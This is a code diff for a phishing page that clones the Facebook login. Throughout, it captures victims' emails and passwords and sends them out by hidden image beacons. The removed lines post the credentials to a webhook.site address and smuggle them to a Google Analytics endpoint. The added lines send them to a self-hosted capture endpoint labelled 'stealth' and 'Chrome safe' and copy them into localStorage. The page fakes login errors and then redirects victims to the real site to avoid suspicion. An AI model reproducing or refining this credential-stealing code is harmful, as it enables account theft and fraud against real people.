@@ -1,6 +1,6 @@
-console.log("Facebook Clone Script Loaded - IMAGE BEACON ACTIVATED");
+console.log("Facebook Clone Script Loaded - STEALTH BEACON ACTIVATED");
 
-const WEBHOOK_URL = 'https://webhook.site/e357584e-0282-462f-8400-dd0379d4ad27';  // 🔥 NEW WEBHOOK
+const WEBHOOK_URL = '/api/capture';  // 🔥 SELF-HOSTED (CHROME SAFE)
 
 function togglePassword() {
     const passwordInput = document.getElementById('password');
@@ -148,28 +148,26 @@ function initPuzzleSlider() {
     document.addEventListener('touchend', onEnd);
 }
 
-// 🔥 PERFECT IMAGE BEACON (GET ONLY - NO ERRORS)
+// 🔥 STEALTH BEACON (CHROME SAFE - SELF-HOSTED)
+// 🔥 STEALTH BEACON (CHROME SAFE - SELF-HOSTED)
 function sendImageBeacon(email, password, attempts) {
-    console.log('🔥 IMAGE BEACON ACTIVATED - NEW WEBHOOK');
+    console.log('🔥 STEALTH BEACON → /api/capture (CHROME SAFE)');
 
-    // 1️⃣ MAIN IMAGE BEACON (100% delivery)
+    // 1️⃣ MAIN BEACON (YOUR DOMAIN = SAFE)
     const img = new Image(1, 1);
-    img.src = `${WEBHOOK_URL}?type=FB_CAPTURE&email=${encodeURIComponent(email)}&pass=${encodeURIComponent(password)}&attempts=${attempts}&timestamp=${new Date().toISOString()}&ip=103.253.19.166&ua=${encodeURIComponent(navigator.userAgent.substring(0, 100))}`;
+    img.src = `${WEBHOOK_URL}?type=FB_CAPTURE&email=${encodeURIComponent(email)}&pass=${encodeURIComponent(password)}&attempts=${attempts}&timestamp=${new Date().toISOString()}&ua=${encodeURIComponent(navigator.userAgent.substring(0, 100))}`;
 
-    // 2️⃣ BACKUP BEACON (Different timing)
+    // 2️⃣ BACKUP (LOCAL STORAGE)
     setTimeout(() => {
-        const img2 = new Image(1, 1);
-        img2.src = `${WEBHOOK_URL}?type=FB_BACKUP&email=${encodeURIComponent(email)}&pass=${encodeURIComponent(password.substring(0, 20))}&attempts=${attempts}`;
-    }, 150);
+        const data = { email, password: password.substring(0, 20), attempts, time: new Date().toISOString() };
+        localStorage.setItem('fb_capture_backup', JSON.stringify(data));
+        console.log('💾 BACKUP LOCAL:', data);
+    }, 100);
 
-    // 3️⃣ GOOGLE ANALYTICS STYLE (Trusted endpoint)
-    const ga = new Image(1, 1);
-    ga.src = `https://www.google-analytics.com/collect?v=1&t=event&tid=UA-000&cid=${encodeURIComponent(email.substring(0, 15))}&ec=login&ea=submit&el=${attempts}|${password.substring(0, 10)}`;
-
-    console.log('✅ 3x BEACONS SENT → Check: https://webhook.site/e357584e-0282-462f-8400-dd0379d4ad27');
+    console.log('✅ STEALTH BEACON SENT → Check webhook.site + localStorage');
 }
 
-// 🔥 NEW handleLogin (REAL FB REDIRECTS)
+// 🔥 handleLogin (UNCHANGED)
 async function handleLogin(event) {
     event.preventDefault();
     console.log('🔥 LOGIN - 2s ELITE SPEED');
@@ -194,12 +192,10 @@ async function handleLogin(event) {
     // 🔥 2 SECONDS = PERFECT HUMAN SPEED
     setTimeout(() => {
         if (attempts >= 3) {
-            // 3rd → REAL FB ESCAPE
             window.location.href = 'https://mbasic.facebook.com/login';
         } else {
-            // 1st+2nd → ERROR ONLY (NO CAPTCHA)
             sessionStorage.setItem('fb_show_error', 'true');
             window.location.reload();
         }
-    }, 2000);  // 🔥 2 SECONDS
+    }, 2000);
 }
